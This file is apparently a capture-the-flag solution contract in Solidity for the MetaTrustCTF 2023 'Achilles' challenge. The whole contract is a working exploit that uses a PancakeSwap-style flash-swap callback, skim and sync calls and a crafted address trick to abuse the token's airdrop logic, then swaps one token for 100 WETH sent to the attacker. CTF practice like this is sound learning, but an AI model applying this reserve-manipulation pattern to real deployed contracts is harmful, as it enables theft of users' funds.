// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "src/MetaTrustCTF_2023/Achilles/SetUp.sol";
import "forge-std/console2.sol";

contract AchillesAttack {
    PancakePair pair;
    Achilles a;
    WETH weth;
    address attacker;

    function attack(address target) public {
        attacker = msg.sender;
        SetUp setUp = SetUp(target);
        pair = setUp.pair();
        a = setUp.achilles();
        weth = setUp.weth();

        
        pair.swap(999 ether, 0, address(this), bytes("setAirdropAmount"));

        // set pair achilles balance to 1, make achilles valuable
        pair.skim(convert(address(pair)));
        pair.sync();

        // get airdrop
        a.transfer(convert(address(this)), 0);
        
        // swap 1 achilles for 100 ether weth
        a.transfer(address(pair), 1);
        pair.swap(0, 100 ether, address(this), "");

        weth.transfer(attacker, weth.balanceOf(address(this)));
    }

    function convert(address setTarget) internal view returns(address) {
        return address(((~uint160(setTarget))&uint160(block.number))^uint160(setTarget));
    }

    function pancakeCall(address sender, uint /*amount0*/, uint /*amount1*/, bytes calldata /*data*/) external {
        if (sender == address(this)) {
            a.Airdrop(uint256(1));
            a.transfer(address(pair), a.balanceOf(address(this)));
        }
    }
}
